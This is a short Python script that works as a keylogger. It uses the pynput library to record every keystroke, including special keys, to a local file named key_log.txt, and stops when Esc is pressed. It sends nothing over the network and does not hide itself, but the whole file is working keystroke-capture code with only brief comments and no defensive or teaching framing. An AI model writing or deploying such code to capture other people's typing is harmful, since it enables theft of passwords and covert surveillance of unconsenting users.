from pynput.keyboard import Listener,Key

# Define the file where keystrokes will be saved
log_file = "key_log.txt"

# Function to write the pressed key to the log file
def on_press(key):
    try:
        # Log the alphanumeric keys
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (like space, enter, etc.) are written in a different format
        with open(log_file, "a") as f:
            f.write(f" {key} ")

# Function to stop the keylogger (optional)
def on_release(key):
    # This will stop the listener if the escape key is pressed
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
